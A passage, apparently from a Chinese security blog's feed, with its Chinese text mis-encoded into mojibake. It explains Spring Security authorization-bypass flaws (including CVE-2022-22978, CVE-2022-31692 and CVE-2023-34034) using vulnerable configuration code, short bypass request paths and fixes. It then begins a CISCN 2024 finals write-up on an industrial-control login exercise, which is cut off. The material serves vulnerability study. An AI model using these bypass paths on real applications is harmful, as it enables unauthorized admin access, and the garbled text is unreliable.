string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="useSuffixPatternMatch-ä½ç‰ˆæœ¬æƒé™ç»•è¿‡"><a href="#useSuffixPatternMatch-ä½ç‰ˆæœ¬æƒé™ç»•è¿‡" class="headerlink" title="useSuffixPatternMatch ä½ç‰ˆæœ¬æƒé™ç»•è¿‡"></a>useSuffixPatternMatch ä½ç‰ˆæœ¬æƒé™ç»•è¿‡</h1><p>Spring-webmvcç‰ˆæœ¬åœ¨&lt;&#x3D;4.3.25çš„æƒ…å†µä¸‹<code>suffixPatternMatch</code>é»˜è®¤ä¸º<code>True</code></p><p>è¯¥æ–¹æ³•ä¸ºæ˜¯å¦å¯ç”¨åè¾åŒ¹é…,å¦‚æœå¯ç”¨,åˆ™æ˜ å°„åˆ°<code>/users</code>çš„æ–¹æ³•ä¹Ÿå¯ä»¥åŒ¹é…åˆ°<code>/users.*</code></p><p>ä¹Ÿå°±æ˜¯è¯´<code>/users</code> å’Œ<code>/users.*</code>æ˜¯ç›¸ç­‰çš„</p><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h2><p>ä½ç‰ˆæœ¬ï¼ˆ1.xï¼‰çš„springbootä¸Šèƒ½ç»•è¿‡</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin.123456789</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¿®å¤-2"><a href="#ä¿®å¤-2" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>ç‰ˆæœ¬æ›´æ–°</p><hr><h1 id="CVE-2022-22978-ï¼ˆregexMatchersï¼‰"><a href="#CVE-2022-22978-ï¼ˆregexMatchersï¼‰" class="headerlink" title="CVE-2022-22978 ï¼ˆregexMatchersï¼‰"></a>CVE-2022-22978 ï¼ˆregexMatchersï¼‰</h1><p>å½±å“ç‰ˆæœ¬ï¼š</p><p>Spring Security 5.6.x &lt; 5.6.4<br>Spring Security 5.5.x &lt; 5.5.7<br>Spring Security 5.4.x &lt; 5.4.11</p><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/.*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>controlleré…ç½®ï¼šåªèƒ½å¯¹<code>/admin/**</code>è¿™ç§åŒ¹é…æ‰€æœ‰è·¯å¾„çš„è¯­æ³•æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦‚æœå†™æ­»äº†<code>/admin/api</code>ï¼Œè¿™æ ·å­æ˜¯æ— æ³•ç»•è¿‡çš„ï¼Œå› ä¸ºå°±ç®—ç»•è¿‡æƒé™æ ¡éªŒï¼Œä½†æ˜¯ç¨‹åºæ— æ³•åŒ¹é…åˆ°è·¯ç”±</p><h2 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http">/admin/%0a/admin/%0d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ä¿®å¤æ–¹å¼"><a href="#ä¿®å¤æ–¹å¼" class="headerlink" title="ä¿®å¤æ–¹å¼"></a>ä¿®å¤æ–¹å¼</h2><p>æ›´æ–°ç‰ˆæœ¬</p><p>æˆ–è€…æ„Ÿè§‰å¯ä»¥å†™æ­»è·¯ç”±è·¯å¾„</p><hr><h1 id="CVE-2022-31692-ï¼ˆforward-amp-include-è½¬å‘ï¼‰"><a href="#CVE-2022-31692-ï¼ˆforward-amp-include-è½¬å‘ï¼‰" class="headerlink" title="CVE-2022-31692 ï¼ˆforward&amp;include è½¬å‘ï¼‰"></a>CVE-2022-31692 ï¼ˆforward&amp;include è½¬å‘ï¼‰</h1><p>å½“ä½¿ç”¨Spring  Securityçš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šåˆ›å»ºä¸€ä¸ª<code>SecurityFilterChain</code>æ¥ä¸ºç‰¹å®šçš„è·¯ç”±è®¾ç½®æƒé™ï¼Œè·¯ç”±Aä¸ºåŒ¿åè®¿é—®æƒé™ï¼Œè·¯ç”±Bä¸ºé«˜æƒé™ï¼Œå¦‚æœåœ¨Controllerä¸­å®šä¹‰ä½æƒé™Aè·¯ç”±returnçš„æ—¶å€™ï¼Œä½¿ç”¨äº†<code>forward</code>æˆ–<code>include</code>è¯·æ±‚ï¼Œå°†ä¼šå¯¼è‡´å°†ä½æƒé™çš„è¯·æ±‚è½¬å‘æˆ–åŒ…å«åˆ°ä¸€ä¸ªæ›´é«˜æƒé™çš„å®‰å…¨ç«¯ç‚¹ï¼Œä»è€Œå®ç°è¶Šæƒ</p><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http                <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/forward"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                .antMatchers("/**").permitAll();</span><span class="token comment">//                .antMatchers("/test/**").permitAll();</span>        <span class="token comment">// @formatter:on</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:off</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// @formatter:on</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecdemo2<span class="token punctuation">.</span>demos<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/forward"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//    @GetMapping("/forward")</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"include:/admin"</span><span class="token punctuation">;</span>        <span class="token comment">//return "forward:/admin";</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">adminapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello adminapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/api"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">testapi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello testapi"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/test/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello test"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//    @RequestMapping(value = &#123;"/**"&#125;, method = &#123;RequestMethod.GET&#125;)</span><span class="token comment">//    @ResponseBody</span><span class="token comment">//    public String guest() &#123;</span><span class="token comment">//        return "hello guest";</span><span class="token comment">//    &#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="CVE-2023-34034ï¼ˆWebFluxï¼‰"><a href="#CVE-2023-34034ï¼ˆWebFluxï¼‰" class="headerlink" title="CVE-2023-34034ï¼ˆWebFluxï¼‰"></a>CVE-2023-34034ï¼ˆWebFluxï¼‰</h2><p>åœ¨Spring Securityä¸­ï¼Œ<code>ServerHttpSecurity</code>å’Œ<code>HttpSecurity</code>åˆ†åˆ«ç”¨äºé…ç½®WebFluxå’ŒWeb MVCåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§</p><p>å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>6.1.0 to 6.1.1</li><li>6.0.0 to 6.0.4</li><li>5.8.0 to 5.8.4</li><li>5.7.0 to 5.7.9</li><li>5.6.0 to 5.6.11</li></ul><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">authorizeExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">pathMatchers</span><span class="token punctuation">(</span><span class="token string">"admin/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token comment">// æ²¡æœ‰ä»¥ / ä¸ºå¼€å§‹</span>                <span class="token punctuation">.</span><span class="token function">anyExchange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>controllerï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/admin/**"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"hello admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¶çƒ­æ‰“é“v2ï¼Œè™½ç„¶å®é™…ä¸Šæ˜¯çº¯è®°å½•ç”¨çš„&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://xz.aliyun.com/t/13235&quot;&gt;https://xz.aliyun.com/t/13235&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCNå†³èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/</id>
    <published>2024-07-12T02:29:03.000Z</published>
    <updated>2024-08-09T17:50:30.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>2024.7.20-21æˆéƒ½</p><p>NISA-WhySeriousä½37å…¨å›½äºŒç­‰å¥–</p><span id="more"></span><p>wpå‚è€ƒï¼š</p><p><a href="https://blog.hxzzz.asia/archives/192/">https://blog.hxzzz.asia/archives/192/</a></p><p><a href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p><hr><h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>è¿‡â€¦è¿‡æ ·ä¾‹ï¼Ÿ</p><p>æœ¬å…³è€ƒéªŒä½ ä¸­è¯‘ä¸­çš„èƒ½åŠ›ï¼ˆx</p><p>æˆ‘å°±çœ‹äº†å‰ä¸¤ä¸ªä»»åŠ¡ï¼Œé˜Ÿå‹tqlï¼Œè¿é€šä¿©å®µakäº†build</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721222456197.png" alt="image-20240721222456197"></p><h2 id="æ–°æ‰‹ä»»åŠ¡"><a href="#æ–°æ‰‹ä»»åŠ¡" class="headerlink" title="æ–°æ‰‹ä»»åŠ¡"></a>æ–°æ‰‹ä»»åŠ¡</h2><h3 id="èƒŒæ™¯åº”ç”¨äº†è§£"><a href="#èƒŒæ™¯åº”ç”¨äº†è§£" class="headerlink" title="èƒŒæ™¯åº”ç”¨äº†è§£"></a>èƒŒæ™¯åº”ç”¨äº†è§£</h3><h4 id="æ¨¡æ‹Ÿå·¥ç¨‹å¸ˆç™»å½•æµç¨‹"><a href="#æ¨¡æ‹Ÿå·¥ç¨‹å¸ˆç™»å½•æµç¨‹" class="headerlink" title="æ¨¡æ‹Ÿå·¥ç¨‹å¸ˆç™»å½•æµç¨‹"></a>æ¨¡æ‹Ÿå·¥ç¨‹å¸ˆç™»å½•æµç¨‹</h4><blockquote><p>åœ¨å·¥ç¨‹å¸ˆç”¨æˆ·ï¼ˆinstance&#x2F;engineer&#x2F;user)ç›®å½•ä¸‹ï¼Œç¼–å†™engineer_login.msgï¼Œ å¡«å……å·¥ç¨‹å¸ˆç”¨æˆ·åä¸å£ä»¤, è€Œåè¯•è¿è¡Œusers_login.shï¼Œç¡®è®¤ç”¨æˆ·ç™»å½•æˆåŠŸã€‚</p></blockquote><p>engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨jsonæ ¼å¼å®šä¹‰äº†cubeæ¶æ„ä¸­ä¸€ä¸ªæ ¼å¼ä¸ºï¼ˆGENERAL_RETURN,STRING)çš„æ•°æ®é¡¹ï¼Œè¿™ä¸ªæ•°æ®é¡¹æ˜¯ä¸€ä¸ªé€šç”¨æ•°æ®é¡¹ï¼Œç”±ä¸¤ä¸ªå­—ç¬¦ä¸²nameå’Œreturn_valueç»„æˆï¼š</p><ul><li>nameç”¨æ¥æè¿°æ•°æ®é¡¹çš„ç±»å‹æˆ–ç”¨é€”ï¼Œè¿™é‡Œnameå–å€¼ä¸ºloginï¼Œè¡¨ç¤ºè¯¥æ•°æ®é¡¹ç”¨äºç™»å½•</li><li>return_valueåˆ™å¡«å……è¯¥æ•°æ®é¡¹å…·ä½“å†…å®¹ï¼Œreturn_valueçš„å¼•å·å†…åˆ™æŒ‰ç…§â€œç”¨æˆ·åï¼šå£ä»¤â€çš„æ–¹å¼å¡«å……å†…å®¹</li></ul><p>æ³¨ï¼šç”¨æˆ·åå’Œå£ä»¤ä¿¡æ¯åœ¨ç®¡ç†ä¸­å¿ƒå·¥ä½œç›®å½•(instance&#x2F;monitor&#x2F;center)é‡Œå¯»æ‰¾</p><p><a id="user.list">instance&#x2F;monitor&#x2F;center&#x2F;user.list</a></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"SERVER_STATE"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhao"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_MONITOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"li"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"zhou"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"user_name"</span><span class="token operator">:</span><span class="token string">"wu"</span><span class="token punctuation">,</span><span class="token property">"role"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"456"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯å¡«å…¥engineer_login.msg</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span><span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè¿è¡Œusers_login.shå³å¯</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712104227225.png" alt="image-20240712104227225"></p><hr><h4 id="æ¨¡æ‹Ÿé€»è¾‘ä»£ç ä¸Šä¼ "><a href="#æ¨¡æ‹Ÿé€»è¾‘ä»£ç ä¸Šä¼ " class="headerlink" title="æ¨¡æ‹Ÿé€»è¾‘ä»£ç ä¸Šä¼ "></a>æ¨¡æ‹Ÿé€»è¾‘ä»£ç ä¸Šä¼ </h4><blockquote><p>åœ¨2024buildup&#x2F;src&#x2F;logic&#x2F;thermostat_logicç›®å½•ä¸‹å†™äº†ä¸€ä¸ªæ¨¡æ‹ŸPLCè¡Œä¸ºçš„ä»£ç ï¼Œç”¨å…¶æºç thermostat_logic.cæ¥æ¨¡æ‹ŸPLCæºç ï¼Œå…¶ç¼–è¯‘åçš„åŠ¨æ€åº“libthermostat_logic.soæ¥æ¨¡æ‹ŸPLCé€»è¾‘ã€‚è¯·åœ¨å·¥ç¨‹å¸ˆç”¨æˆ·ç›®å½•ç¼–å†™code_upload.msgï¼Œå¡«å†™æ­£ç¡®çš„ä¸Šä¼ ä»£ç 